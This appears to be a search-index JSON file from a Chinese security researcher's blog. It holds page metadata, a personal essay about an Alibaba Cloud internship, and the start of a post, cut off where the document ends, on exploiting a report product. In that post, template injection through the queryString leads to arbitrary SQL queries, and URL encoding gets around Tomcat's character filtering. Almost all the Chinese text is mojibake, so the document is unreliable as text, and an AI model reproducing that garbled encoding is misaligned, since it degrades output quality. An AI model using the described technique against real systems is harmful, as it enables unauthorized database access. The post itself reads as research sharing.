{"meta":{"title":"Y4tacker:Hacking The World!","subtitle":"","description":"","author":"Y4tacker","url":"https://y4tacker.github.io","root":"/"},"pages":[{"title":"æ–‡ç« å½’æ¡£","date":"2024-08-04T09:01:49.929Z","updated":"2024-08-04T09:01:49.929Z","comments":true,"path":"archive.html","permalink":"https://y4tacker.github.io/archive.html","excerpt":"","text":""},{"title":"","date":"2024-08-04T09:01:49.930Z","updated":"2024-08-04T09:01:49.930Z","comments":true,"path":"google4e6948178b5b9b74.html","permalink":"https://y4tacker.github.io/google4e6948178b5b9b74.html","excerpt":"","text":"google-site-verification: google4e6948178b5b9b74.html"},{"title":"About me","date":"2022-02-02T13:39:44.000Z","updated":"2024-08-04T09:01:49.929Z","comments":true,"path":"about/index.html","permalink":"https://y4tacker.github.io/about/index.html","excerpt":"","text":"ğŸ‘‹Hiï¼ŒIâ€™am Y4tacker å®é™è‡´è¿œï¼Œæ·¡æ³Šæ˜å¿— ğŸ”­ CTFer: @0x401 Team(The third captain)/@R3kapig(Member) â­ï¸ Github: https://github.com/Y4tacker ğŸ” Blog: http://y4tacker.github.io/ ğŸ’¡ Alibaba Coud"},{"title":"links","date":"2013-07-13T12:46:25.000Z","updated":"2024-08-04T09:01:49.930Z","comments":true,"path":"friend.html","permalink":"https://y4tacker.github.io/friend.html","excerpt":"","text":""},{"title":"article","date":"2022-02-02T09:01:52.000Z","updated":"2024-08-04T09:01:49.929Z","comments":true,"path":"article/index.html","permalink":"https://y4tacker.github.io/article/index.html","excerpt":"","text":""},{"title":"å‹é“¾","date":"2022-07-09T14:57:33.000Z","updated":"2024-08-04T09:01:49.932Z","comments":true,"path":"link/index.html","permalink":"https://y4tacker.github.io/link/index.html","excerpt":"","text":"Web 4ra1n: è®¸å°‘ï¼ï¼ï¼ è¿œæµ· : å‡¡æ˜¯è¿‡å¾€,çš†ä¸ºåºç« . rayzz: just do it. ek1ng: YESTERDAY YOU SAID TOMORROW. Snakinya: è‹å±±è´Ÿé›ªï¼Œæ˜çƒ›å¤©å—. æ›¾å“¥: å¼±å°å’Œæ— çŸ¥ä¸æ˜¯ç”Ÿå­˜çš„éšœç¢ï¼Œå‚²æ…¢æ‰æ˜¯ï¼ MiaoTony: ä»°æœ›æ˜Ÿç©ºï¼Œè„šè¸å®åœ°ï¼Œæœªæ¥å¯æœŸ. R3gr3t: æˆ˜é˜ŸWebå¸ˆå‚…&amp;å­¦å¼Ÿ. Binary Minhal: æˆ˜é˜Ÿé€†å‘å¸ˆå‚…&amp;å­¦é•¿ CrazyMan: ç©ºç™½ï¼ï¼ï¼ apeng: Reverse Everything xia0ji233: è€å½“ç›Šå£®ï¼Œå®ç§»ç™½é¦–ä¹‹å¿ƒï¼Ÿç©·ä¸”ç›Šåšï¼Œä¸å é’äº‘ä¹‹å¿—."},{"title":"åˆ†ç±»","date":"2018-01-04T16:00:00.000Z","updated":"2024-08-04T09:01:49.930Z","comments":true,"path":"categories/index.html","permalink":"https://y4tacker.github.io/categories/index.html","excerpt":"","text":""},{"title":"search","date":"2023-12-10T08:11:53.000Z","updated":"2024-08-04T09:01:49.932Z","comments":true,"path":"search/index.html","permalink":"https://y4tacker.github.io/search/index.html","excerpt":"","text":""},{"title":"æ ‡ç­¾","date":"2018-01-04T16:00:00.000Z","updated":"2024-08-04T09:01:49.932Z","comments":true,"path":"tags/index.html","permalink":"https://y4tacker.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"ä¿ç ”orå°±ä¸š---é˜¿é‡Œäº‘å®ä¹ ä¹‹æ—…","slug":"year/2022/10/ä¿ç ”orå°±ä¸š---é˜¿é‡Œäº‘å®ä¹ ä¹‹æ—…","date":"2024-08-04T09:01:49.064Z","updated":"2024-08-04T09:01:49.064Z","comments":true,"path":"2024/08/04/year/2022/10/ä¿ç ”orå°±ä¸š---é˜¿é‡Œäº‘å®ä¹ ä¹‹æ—…/","link":"","permalink":"https://y4tacker.github.io/2024/08/04/year/2022/10/%E4%BF%9D%E7%A0%94or%E5%B0%B1%E4%B8%9A---%E9%98%BF%E9%87%8C%E4%BA%91%E5%AE%9E%E4%B9%A0%E4%B9%8B%E6%97%85/","excerpt":"","text":"ä¿ç ”orå°±ä¸š â€” é˜¿é‡Œäº‘å®ä¹ ä¹‹æ—…å§‹ç« â€‹ æ˜¨å¤©åˆšå›æˆéƒ½ï¼Œä¹‹å‰ä¸€ç›´åœ¨é—®è‡ªå·±ç»“æœçœŸçš„æœ‰é‚£ä¹ˆé‡è¦å—ï¼Œç°åœ¨æˆ‘ä¹Ÿèƒ½é¼“èµ·å‹‡æ°”å¯¹è‡ªå·±è¯´ï¼Œä¸é‡è¦äº†ï¼Œæˆ‘çš„ä¸–ç•Œå±äºæˆ‘ï¼Œæˆ‘çš„äººç”Ÿä¹Ÿæ²¡æœ‰é‚£ä¹ˆå¤šçš„è§‚ä¼—ï¼Œæˆ‘ä¹Ÿæ²¡å¿…è¦åœ¨æ„ä»–äººçš„ç›®å…‰ï¼Œæˆ‘ç»ˆäºåˆæˆé•¿äº†ä¸€ç‚¹ã€‚ å®ä¹ ç»å†â€‹ ï¼ˆç»å†è¿™éƒ¨åˆ†å°±æŒ‘ç€é‡ç‚¹çš„æˆ–è€…å’Œæ—¶é—´æ€§æœ‰å…³çš„è¯´è¯´ï¼Œæˆ‘ä¹Ÿæ‡’ï¼‰ â€‹ ä¸ƒæœˆä¸­æ—¬æ”¶æ‹¾å¥½è¡Œæç‹¬è‡ªå‰å¾€ä¸€ä¸ªé™Œç”Ÿçš„åŸå¸‚ï¼Œèµ·åˆå¯¹æ­å·çš„å½±å“ä¹Ÿå°±æ˜¯èµ›åšç¾¤é‡Œè¯´çš„é¥­ä¸å¥½åƒï¼Œè¯´æˆ‘è¿™ä¸ªæˆéƒ½äººä¸€å®šä¸ä¹ æƒ¯(Ps:ä¸è¿‡å¤–å–è¿˜æ˜¯å¾ˆä¸é”™çš„)ï¼Œåˆ°äº†æ­å·æµ…æµ…æ”¶è§†äº†ä¸‹æˆ¿é—´ï¼Œä¾¿è¢«å¾å¸ˆå«å‡ºå»å¹²é¥­äº†ï¼Œä¸»ç®¡ç¡®å®æ˜¯ä¸€ä¸ªå¾ˆå¥½ä¹Ÿå¾ˆçƒ­æƒ…çš„äººï¼Œåœ¨åƒé¥­è¿‡ç¨‹ä¸­å¸®åŠ©æˆ‘å¼€å§‹ç†Ÿæ‚‰ç¯å¢ƒï¼Œä¹Ÿåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æœ‰äº†å¯¹å·¥ä½œçš„ç®€å•è®¤çŸ¥(Ps:è‡³å°‘çŸ¥é“äº†å’‹æ˜¯åšWafäº§å“å’ŒRASPäº§å“). â€‹ ç¬¬ä¸€å¤©åˆšä¸Šç­çš„æ—¶å€™ï¼Œæ‡µæ‡µæ‡‚æ‡‚ä¸çŸ¥é“å¹²ä»€ä¹ˆï¼Œç´¢æ€§åœ¨å…¬å¸å‘çš„æ–°ç”µè„‘ä¸Šè¾¹é…ç½®ç¯å¢ƒè¾¹ç ”ç©¶ç€æ¥ä¹‹å‰æ²¡æå®Œçš„å®‰å…¨ç ”ç©¶ã€‚åˆ°äº†ç¬¬äºŒå¤©ï¼Œä¸»ç®¡æ‹‰æˆ‘å»å¼€ä¼šå¸®åŠ©æˆ‘ç¡®å®šäº†æˆ‘å®ä¹ æœŸé—´çš„å†…å®¹ï¼Œæ€»ä½“è€Œè¨€è¿˜æ˜¯å¾ˆå¥½çš„ï¼Œç»™äº†æˆ‘å¾ˆå¤šè‡ªç”±å‘å±•çš„ç©ºé—´ã€‚æœ‰ç€å…¬å¸æä¾›çš„å„ç§èµ„æºï¼Œç¬¬ä¸€ä¸ªæœˆä¹Ÿæ˜¯æˆ‘æŠ€æœ¯æˆé•¿æœ€å¿«çš„æ—¶å€™ï¼›ä¸€æ–¹é¢æˆ‘å¾ˆå–œæ¬¢ç ”ç©¶æ–°çš„ä¸œè¥¿ï¼Œå¦ä¸€æ–¹é¢æˆ‘è¿˜æ˜¯å’Œä»¥å‰ä¸€æ ·çš„æ— æ‰€é¡¾å¿Œã€‚å½“ç„¶è¿™æ—¶å€™çš„æˆ‘ä¹Ÿä¸å–œæ¬¢æ€è€ƒåªæƒ³ç€è¿™ä¸ªæŠ€æœ¯ç‚¹æœ‰æ„æ€å°±ç ”ç©¶å®ƒï¼Œæ¯•ç«Ÿåœ¨æˆ‘å¿ƒé‡Œä¸€ç›´ä»¥æ¥çš„æƒ³æ³•éƒ½æ˜¯æˆ‘å°±è®¤è®¤çœŸçœŸæä¸ªæŠ€æœ¯ï¼Œéœ€è¦è€ƒè™‘é‚£ä¹ˆå¤šä¹ˆã€‚åœ¨ç¬¬ä¸€ä¸ªæœˆçš„å®ä¹ è¿‡ç¨‹ä¸­ï¼Œä¹Ÿå‡­å€Ÿç€è‡ªå·±çš„åŠªåŠ›å¸®åŠ©äº§å“æ‰¾åˆ°äº†ä¸€äº›æ½œåœ¨éšæ‚£ï¼Œåœ¨å·¥ä½œæ–¹é¢ä¹Ÿå¾—åˆ°äº†å¸ˆå…„çš„è®¤å¯ã€‚ â€‹ è½¬çœ¼åˆ°äº†ç¬¬äºŒä¸ªæœˆï¼Œç§‹æ‹›æ¥äº†ï¼Œä½†ç§‹æ‹›å’Œæˆ‘å…¶å®ä¸€ç›´æ²¡å•¥å…³ç³»ï¼Œæ¯•ç«Ÿæ¯å¤©ä¸Šä¸‹ç­æ—¶é—´é‡Œæˆ‘ä¹Ÿä¸å¯èƒ½å»é¢è¯•ï¼Œé‚£æ—¶å¬è¯´å…«æœˆæ˜¯æå‰æ‰¹ï¼Œè™½ç„¶è‡ªå·±æ²¡åŠæ³•å‚åŠ ç§‹æ‹›ä½†ä¸å½±å“æˆ‘å¥½å¥‡ä¸€äº›æ•´ä½“çš„æƒ…å†µï¼Œäºæ˜¯ä¹æ‰“å¼€äº†è„‰è„‰å¼€å§‹äº†æˆ‘çš„å¿ƒæ€ä¹‹æ—…(Ps:è„‰è„‰æ²»å¥½äº†æˆ‘çš„ç²¾ç¥å†…è€—ï¼Œä¹Ÿè®©æˆ‘æˆé•¿äº†ä¸å°‘)ï¼Œå’Œæˆ‘æƒ³çš„ä¸€æ ·ï¼Œä»Šå¹´æ•´ä½“å½¢åŠ¿å¹¶ä¸ä¹è§‚ï¼Œå¾ˆå¤šäººåœ¨ä¸Šé¢åŸ‹æ€¨æ€ä¹ˆæ€ä¹ˆæ»´ä¸å¥½ã€‚é‚£æ—¶å€™æˆ‘ä¹Ÿæ²¡æƒ³å¾ˆå¤šï¼Œå¶å°”ä¹Ÿä¼šæ‹¿ç€å›¾å»ç¾¤é‡Œè°ƒä¾ƒï¼Œåæ¥æ¸æ¸åƒç“œåƒåˆ°äº†è‡ªå·±ï¼Œçœ‹åˆ°äº†é˜¿é‡Œçš„ä¸€äº›æ¶ˆæ¯ï¼Œæˆ‘ä¹Ÿå¼€å§‹é€æ¸æ‹…å¿ƒèµ·è‡ªå·±æ¥äº†ï¼Œæ‹…å¿ƒè‡ªå·±æ²¡æ—¶é—´é¢è¯•å…¶ä»–å…¬å¸å¦‚æœè¿™è¾¹æ²¡è¿‡æ€ä¹ˆåŠï¼Œåœ¨ä¸­é€”æˆ‘ä¹Ÿå‘ä¸»ç®¡è¡¨ç¤ºè¿‡æˆ‘çš„æ‹…å¿ƒï¼Œå°½ç®¡ä¸»ç®¡ä¹Ÿæ‹‰æˆ‘è°ˆè¿‡è¯æˆ‘ä¹Ÿæ²¡æ³•æ¶ˆé™¤è¿™ä¸ªç–‘è™‘ï¼Œæ¯•ç«Ÿå¾ˆç°å®çš„é—®é¢˜æˆ‘è‡³å°‘å¾—æœ‰ä¸ªå·¥ä½œå§ï¼Œå½“ç„¶å…¶å®è¿™æ—¶å€™è¿™æ–¹é¢æƒ³æ³•å¯¹æˆ‘å½±å“å¹¶ä¸å¤§ï¼Œæ¯•ç«Ÿç§‹æ‹›æ‰åˆ°æå‰æ‰¹ï¼Œæ—¶é—´æ¥ç€å¾€ä¸‹èµ°ç»ˆäºåˆ°äº†æ­£å¼æ‰¹ï¼Œè¿™æ—¶å€™æˆ‘åˆçœ‹åˆ°äº†å¦ä¸€ä¸ªæ¶ˆæ¯ï¼Œâ€œé˜¿é‡Œäº‘ä»Šå¹´å¡æœ¬ç§‘å­¦å†ï¼Œä¸æ˜¯ç¡•å£«ä¸èƒ½å‚åŠ è½¬æ­£ç­”è¾©â€ï¼Œè¿™æ—¶å€™å™©æ¢¦ç»ˆäºå¼€å§‹äº†ï¼Œæ¯•ç«Ÿå¬åˆ°è¿™ä¸ªæ¶ˆæ¯æ—¶ä¹æœˆå·²ç»è¿‡äº†1/3äº†ï¼Œè¿™æ—¶å€™æˆ‘ä¹Ÿç»å¸¸å’Œå¸ˆå…„åæ§½xxxï¼Œå¾å¸ˆä¹Ÿæ‰¾è¿‡æˆ‘å¸®æˆ‘ç¼“è§£äº†ä¸€äº›ç„¦è™‘ï¼Œæˆ‘ä¹Ÿç»§ç»­åšç€æˆ‘çš„å®ä¹ å·¥ä½œï¼Œåœ¨è¿™æœŸé—´ä¹Ÿå‘è¡¥å¤©ç™½å¸½å¤§ä¼šæŠ•äº†è‡ªå·±çš„è®®é¢˜ï¼Œå¾ˆé«˜å…´çš„ä¹Ÿè¿‡äº†å®¡æ ¸ã€‚ â€‹ åˆ°äº†ç¬¬ä¸‰ä¸ªæœˆï¼Œæˆ‘ä¹Ÿé¡ºç†æˆç« æ”¶åˆ°äº†å‡†å¤‡è½¬æ­£ç­”è¾©çš„äº‹æƒ…ï¼Œä¸å¾—ä¸è¯´å¾å¸ˆäººçœŸçš„å¾ˆå¥½ï¼Œå…¶å®æˆ‘å¹³æ—¶æ˜¯å¾ˆå°‘åšPPTçš„ï¼Œåšçš„è¯ä¹Ÿæ˜¯é‚£ç§å‡‘åˆç€èƒ½ç”¨çš„ç±»å‹ï¼Œæ¯•ç«Ÿåœ¨å­¦æ ¡æœŸé—´æˆ‘é€šå¸¸ä¹Ÿåªæ˜¯æŠ€æœ¯è¾“å‡ºï¼Œå¹¶ä¸å–œæ¬¢èŠ±å¾ˆå¤šæ—¶é—´åˆ°æ–‡ç¨¿ä¸Šã€‚åœ¨è¿™æœŸé—´ä¸»ç®¡å’Œå¸ˆå…„ç¡®å®å¸®äº†æˆ‘å¾ˆå¤šï¼Œå‰æœ‰å¸ˆå…„å¸®åŠ©æ¢³ç†é€»è¾‘ï¼Œåæœ‰å¾å¸ˆæ‰‹æŠŠæ‰‹ä¿®æ”¹æˆ‘çš„PPTã€‚ä¹‹åä¹Ÿé¡ºåˆ©å‚åŠ äº†è½¬æ­£ç­”è¾©ï¼Œè™½ç„¶æ•ˆæœä¸æ˜¯å¾ˆå¥½ï¼Œæ¯•ç«Ÿæˆ‘ä¹Ÿå¾ˆéš¾ä»ä¸€ä¸ªçº¯æŠ€æœ¯äººçš„è§’åº¦åšå¿«é€Ÿçš„è½¬å˜ï¼Œå¯¹è®²PPTæˆ‘ä¹Ÿåªæ˜¯ä¸ªæ–°äººã€‚ç­”è¾©å®Œä»¥åæˆ‘ä¹Ÿä¹¦å½’æ­£ä¼ ç»§ç»­è‡ªå·±çš„ä¸€äº›å­¦ä¹ ç ”ç©¶ï¼Œæ—¶é—´å°±è¿™æ ·èµ°ç€ç»ˆäºæœ€åä¸€ä¸ªå¯¼ç«ç´¢æ¥äº†ï¼Œåœ¨çœ‹åˆ°é˜¿é‡Œå®ä¹ ç¾¤é‡Œå°ä¼™ä¼´è¯´ï¼Œâ€œé˜¿é‡Œäº‘ä»Šå¹´æœ¬ç§‘ç”Ÿè½¬æ­£éœ€è¦ç‰¹æ‰¹ï¼ŒåŸºæœ¬ä¸å¯èƒ½â€œï¼Œè¿™ä¸€ç‚¹æœ€ç»ˆä¹Ÿè¢«å¤§ä¸»ç®¡å¾—åˆ°äº†è¯å®ï¼Œæˆ‘ä¹Ÿç»ˆäºç»·ä¸ä½äº†ï¼Œçœ¼æ³ªä¹Ÿæµäº†ä¸‹æ¥ï¼Œä¸ºä»€ä¹ˆä¼šå“­ï¼ŸåŸå› å¾ˆç®€å•å°±æ˜¯ä¸–ç•Œè§‚çš„å´©å¡Œã€‚æˆ‘è¿™ä¹ˆå¤šå¹´çš„åŠªåŠ›çœŸçš„å°±ç™½è´¹äº†ä¹ˆï¼Ÿå½“å¹´æˆ‘çš„é€‰æ‹©ä¸å°±æ˜¯æ”¾å¼ƒå­¦ä¹ åŠªåŠ›å­¦æŠ€æœ¯ç„¶åå·¥ä½œä¹ˆï¼Ÿä¸æ˜¯è¯´å¥½äº†åªè¦æŠ€æœ¯okä¸€åˆ‡éƒ½ä¼šå¥½çš„ä¹ˆï¼Ÿæˆ‘ä¸æ–­åé—®è‡ªå·±ï¼Œä¸€ç›´æ²¡æ³•è¯´æœè‡ªå·±ï¼Œè¿™ä¸ªæ—¶é—´ä¹Ÿæ˜¯æˆ‘æœ€è¿·èŒ«çš„æ—¶åˆ»ï¼Œè¿˜å¥½æˆ‘çš„ä¸»ç®¡å’Œå¸ˆå…„ä¹Ÿæ²¡æœ‰å› ä¸ºè¿™ä»¶äº‹æ”¾å¼ƒæˆ‘ï¼Œæˆ‘ä¹Ÿå¦‚æ„¿èµ°äº†ç‰¹æ‰¹æµç¨‹ï¼Œè‡³äºç»“æœå°±æ…¢æ…¢ç­‰å§ï¼Œtake it easyï¼Œæ¯•ç«Ÿä¹Ÿä¸æ˜¯æˆ‘èƒ½å†³å®šçš„ï¼Œæˆ‘åšå¥½æˆ‘çš„ä¸€åˆ‡å°±å¤Ÿäº†ã€‚æŸå¤©æ™šä¸Šéª‘è½¦å›å®¶çš„è·¯ä¸Šæƒ³èµ·äº†å¤§äºŒçš„è‡ªå·±ï¼Œé‚£æ—¶å€™æ— ç•ï¼Œæ•¢å†²æ’ï¼Œæœ‰åŠ›é‡ï¼Œæ•¢æ”¾å¼ƒå·²æœ‰çš„æˆç»©ï¼ŒæŠ•èº«æŠ€æœ¯ï¼Œé‚£æ—¶å€™æ¯å¤©èµ·æ—©è´ªé»‘åªæœ‰ä¸€ä¸ªç›®æ ‡ï¼Œå˜å¼ºï¼Œä»æ¥ä¹Ÿä¸ä¸ºç»“æœï¼Œä½†è‡ªä»å®ä¹ å¼€å§‹ä¸€æ–¹é¢å› ä¸ºå‘¨å›´çš„è´Ÿé¢æƒ…ç»ªå¼€å§‹è…åŒ–äº†è‡ªå·±ï¼Œå¦ä¸€æ–¹é¢ä¸€ç›´ä»¥æ¥ä¹Ÿæœ‰äº›è®¸çš„ç²¾ç¥å†…è€—ï¼Œå¿˜äº†è‡ªå·±çš„æœ¬å¿ƒã€‚ ä¸ºä»€ä¹ˆè¿˜æ˜¯é€‰æ‹©äº†å°±ä¸šâ€‹ åœ¨è¿™æœŸé—´ä¹Ÿå‘ç”Ÿäº†ä¸€ä»¶äº‹ï¼Œå› æ­¤ä¹Ÿå•ç‹¬åˆ—åœ¨æœ€åäº†ï¼Œè™½ç„¶ç¡®å®ä»å¤§äºŒå¼€å§‹ï¼Œç”±äºå½“æ—¶å†³å®šæ”¾å¼ƒä¿ç ”å‡†å¤‡å·¥ä½œï¼Œå› è€Œæˆ‘å¹³æ—¶ä¸Šè¯¾ä¹Ÿæ²¡å¬è¯¾ï¼ŒæœŸæœ«ä¹Ÿå°±æ˜¯é ç€ä¸€ä¸ªæœˆçš„æ—¶é—´ç®€å•çœ‹çœ‹è¯¾æœ¬äº†è§£ä¸‹åè¯ï¼Œæˆç»©ä¹Ÿä¸ç®—å¥½ï¼Œä¸€ä¸å°å¿ƒå°±ä¿ç ”äº†ä¹Ÿå¾ˆæ„å¤–ï¼Œåœ¨æœ€ç»ˆå†³å®šæ˜¯å¦æ¥å—è¿™ä¸ªä¿ç ”åé¢çš„é‚£ä¸€å¤©ä¹Ÿæ­£å¥½æ˜¯ä¸»ç®¡é—®æˆ‘æ˜¯å¦å†³å®šç‰¹æ‰¹çš„é‚£ä¸€å¤©ï¼Œä¸€åˆ‡éƒ½æ˜¯é‚£ä¹ˆå·§åˆï¼Œä¸»ç®¡ç¡®å®äººä¹Ÿå¾ˆå¥½ï¼Œå‘Šè¯‰æˆ‘å…ˆåˆ«ä¸‹ç»“è®ºä»–å¸®æˆ‘äº†è§£ä¸‹ç‰¹æ‰¹æˆåŠŸç‡å¤§ä¸å¤§ï¼Œä¸è¿‡åœ¨ä¸»ç®¡ç¦»å¼€çš„é‚£ä¸€åˆ»æˆ‘ä¹Ÿå¹¶æ²¡æœ‰çŠ¹è±«å¤šä¹…ï¼Œå†™äº†ä¸€ä»½æ”¾å¼ƒä¿ç ”èµ„æ ¼çš„è¯´æ˜åˆ°äº†å­¦é™¢ï¼Œè™½ç„¶æˆ‘ä¹Ÿä¸çŸ¥é“è‡ªå·±è½¬æ­£æˆåŠŸç‡å¦‚ä½•ï¼Œä½†æˆ‘æƒ³å½“æˆ‘åœ¨æ”¾å¼ƒä¿ç ”èµ„æ ¼ä¸Šå†™ä¸‹æœ€åç½²åçš„é‚£ä¸€åˆ»èµ·ï¼Œæˆ‘ä¹Ÿä¸å†è¿·èŒ«äº†ï¼Œæ¯•ç«Ÿæˆ‘ä¹Ÿä¸å–œæ¬¢é‚£ç§ä¸€çœ¼å°±èƒ½çœ‹åˆ°åº•çš„ç”Ÿæ´»ï¼Œæˆ‘è¿˜æ˜¯é‚£ä¹ˆçš„å–œæ¬¢å†’é™©ï¼Œå–œæ¬¢æœªçŸ¥ï¼Œåœ¨è¿™ä¹‹åèµ›åšç¾¤å¾ˆå¤šäººéƒ½è¯´æˆ‘åº”è¯¥é€‰æ‹©è¯»ç ”ï¼Œä¹Ÿç»™æˆ‘è®²äº†è¯»ç ”çš„å¥½å¤„ã€‚ä½†è°å«æˆ‘ä»å°å°±æ˜¯ä¸ªç‰¹ç«‹ç‹¬è¡Œçš„ä¸»å‘¢ï¼Ÿè™½ç„¶æˆ‘çš„é€‰æ‹©ä¹Ÿä¸ä¸€å®šæ­£ç¡®ï¼Œä½†è‡³å°‘ç¬¦åˆæˆ‘çš„å½“ä¸‹ã€‚å°‘å¹´æ˜¯ä¸éœ€è¦å‘ç”Ÿæ´»å¦¥åçš„ï¼ŒåŸå› å˜›ï¼Ÿæˆ‘è¿˜ç‹ å¹´è½»ï¼Œæˆ‘ä¹Ÿä¸æƒ³ç•™ä¸‹é—æ†¾ã€‚ ç»ˆç« â€‹ å›æƒ³èµ·æ¥è¿™æ®µæ—¶é—´æˆé•¿æ— ç–‘æ˜¯è¿…é€Ÿçš„ â€‹ å¯¹äºæŠ€æœ¯æœ‰äº†æ›´å¤šç»´åº¦çš„æ€è€ƒï¼Œå¼€å§‹ä»è‡†æƒ³é˜¶æ®µå‘ç”Ÿè½¬å˜ï¼Œæ…¢æ…¢å¼€å§‹æ€è€ƒçœ¼ä¸‹åšçš„ä¸œè¥¿å…·ä½“æ„ä¹‰æ˜¯ä»€ä¹ˆï¼Œæ˜¯å¦èƒ½è§£å†³ä¸€äº›å…·ä½“é—®é¢˜ï¼Œå½“ç„¶è¿™æ–¹é¢ä¹Ÿåªæ˜¯åˆšèµ·æ­¥ï¼Œæˆ‘ä¹Ÿä»åœ¨ä¸æ–­å­¦ä¹ ã€‚ â€‹ å¯¹äºç”Ÿæ´»ï¼Œæœ‰äº†æ›´å¤šçš„ä½“éªŒï¼Œè¿ˆå‡ºäº†å¾ˆå¤šçš„ç¬¬ä¸€æ­¥ï¼Œä¹°äº†ç¬¬ä¸€è¾†å…¬è·¯è½¦ï¼Œæœ‰äº†è‡ªå·±çš„å°ç›¸æœºã€‚ â€‹ å½“ç„¶æœ€ä¸»è¦çš„æ˜¯å½»åº•æ²»å¥½äº†æˆ‘çš„ç²¾ç¥å†…è€—ï¼Œä»å¤§å­¦èµ·æå‡ºæ¥çš„è€æ¯›ç—…ï¼Œé—´æ­‡æ€§æ‹…å¿ƒæŸä¸ªç»“æœï¼Œå¿½ç•¥äº†è¿‡ç¨‹çš„æ„ä¹‰ã€‚ç»è¿‡å®ä¹ è¿™ä¸€é­åŸºæœ¬æ˜¯å®Œå…¨æ²»å¥½äº†ï¼Œå°½ç®¡åˆ°ç›®å‰ä¸ºæ­¢ä¹Ÿçœ‹ç€èº«è¾¹é˜¿é‡Œçš„å®ä¹ æœ‹å‹ä»¬éƒ½æ‹¿åˆ°äº†æ„å‘ï¼Œè™½ç„¶æˆ‘è¿™è¾¹ä¹Ÿä¸€ç›´æ²¡åŠ¨é™ï¼Œä½†è¿™åˆæœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œæˆ‘å·²ç»å°½åŠ›åšåˆ°äº†è‡ªå·±çš„æœ€å¥½ï¼Œè¿™å°±è¶³å¤Ÿäº†ã€‚","categories":[{"name":"éšç¬”","slug":"éšç¬”","permalink":"https://y4tacker.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"éšç¬”","slug":"éšç¬”","permalink":"https://y4tacker.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"æŸè½¯Reporté«˜ç‰ˆæœ¬ä¸­åˆ©ç”¨çš„ä¸€äº›ç»†èŠ‚","slug":"year/2024/7/æŸè½¯Reporté«˜ç‰ˆæœ¬ä¸­åˆ©ç”¨çš„ä¸€äº›ç»†èŠ‚","date":"2024-07-23T15:21:43.000Z","updated":"2024-07-26T06:29:40.000Z","comments":true,"path":"2024/07/23/year/2024/7/æŸè½¯Reporté«˜ç‰ˆæœ¬ä¸­åˆ©ç”¨çš„ä¸€äº›ç»†èŠ‚/","link":"","permalink":"https://y4tacker.github.io/2024/07/23/year/2024/7/%E6%9F%90%E8%BD%AFReport%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82/","excerpt":"","text":"æœ¬æ–‡ä»¥ç›®å‰å®˜ç½‘çš„æœ€æ–°ç‰ˆä¸ºä¾‹ï¼Œpocä¼°è®¡å¤§å®¶éƒ½æœ‰äº†ï¼Œè¿™é‡ŒçŒ¥çå‘è‚²ä»…ä»¥æ€è·¯åˆ†äº«ä¸ºä¸» åŸç†æµ…æä»å®˜æ–¹å…¬å‘Šçš„ç»†èŠ‚ä¸éš¾çœ‹å‡ºï¼Œä¸€æ˜¯è®©æˆ‘ä»¬åˆ é™¤sqliteé©±åŠ¨ï¼ŒäºŒæ˜¯é™åˆ¶ç›¸å…³è·¯ç”±çš„è®¿é—®ï¼Œå…³äºè·¯ç”±å…¶å®æ˜¯æ¯”è¾ƒçƒ¦äººçš„ï¼Œè¿™ä¸ªç³»ç»Ÿåœ¨é«˜ç‰ˆæœ¬å…¶å®éƒ½æ˜¯åŸºäºæ³¨è§£åšçš„é…ç½®ï¼Œæ‰€ä»¥å¯»æ‰¾èµ·æ¥ä¼šç›¸å¯¹éº»çƒ¦ï¼Œé€šè¿‡ä¸€ç•ªæŸ¥æ‰¾æˆ‘ä»¬ä¸éš¾å‘ç°åœ¨çŒ¥çå‘è‚².web.controller.ReportRequestCompatibleServiceä¸­ åœ¨ä»£ç ä¸­ä¸éš¾å‘ç°ç›´æ¥å¯¹æˆ‘ä»¬çš„queryStringæ”¾åœ¨äº†æ¨¡æ¿æ¸²æŸ“çš„å‡½æ•°å¤„ç†å½“ä¸­ çŸ¥é“è¿™ä¸€ç‚¹æˆ‘ä»¬å¯ä»¥ç®€å•è¿›è¡Œæµ‹è¯•ï¼Œä¸éš¾å‘ç°ç¡®å®æˆåŠŸåšäº†è§£æ åˆ°è¿™é‡Œå¦‚æœäº†è§£è¿‡ä¸€äº›å†å²æ¼æ´çš„ï¼Œç»“åˆå…¬å‘Šçš„sqliteï¼Œåº”è¯¥ä¹Ÿå¾ˆå®¹æ˜“æƒ³åˆ°ä¸€äº›å†…ç½®å‡½æ•°çš„åˆ©ç”¨ï¼Œè€Œè¿™é‡Œæˆ‘ä»¬ç”¨åˆ°çš„åˆ™æ˜¯sqlå‡½æ•°(å¯¹åº”çŒ¥çå‘è‚².function.SQLï¼Œæœ‰å…´è¶£å¯ä»¥è‡ªå·±çœ‹çœ‹)ï¼Œå› æ­¤ä¾¿å¾ˆå®¹æ˜“é€šè¿‡æ­¤è·¯å¾„æ‰§è¡Œä»»æ„SQLçš„æŸ¥è¯¢ å‘ç‚¹å‘ç‚¹ä¸€(queryStringä¸­çš„ç‰¹æ®Šå­—ç¬¦å¤„ç†)å½“æˆ‘ä»¬å…´é«˜é‡‡çƒˆçš„å»å°è¯•æ‰§è¡Œåˆ©ç”¨ä¸€æ³¢çš„æ—¶å€™ï¼Œä¼šå‘ç°é¡µé¢æŠ¥é”™ï¼Œå½“ç„¶ç†Ÿæ‚‰Javaçš„æœ‹å‹å¯èƒ½ä¸€çœ¼å°±çŸ¥é“ä¸ºä»€ä¹ˆï¼Œtomcatç¦æ­¢ç›´æ¥ä¼ å…¥ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œåœ¨æˆ‘ä»¬sqlæ‰§è¡Œå½“ä¸­å¯èƒ½ç”¨åˆ°çš„å°±æ˜¯åŒå¼•å·ä¸ç©ºæ ¼äº† è§£å†³æ–¹æ¡ˆä¸€: æ—¢ç„¶ä¸èƒ½ä½¿ç”¨æŸäº›ç‰¹æ®Šå­—ç¬¦ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°èƒ½ä¸èƒ½é€šè¿‡urlç¼–ç ä¼ å…¥è¿™äº›ç‰¹æ®Šå­—ç¬¦ï¼Œæ¯•ç«Ÿtomcatæ˜¯æ”¯æŒå¯¹å‚æ•°è§£ç 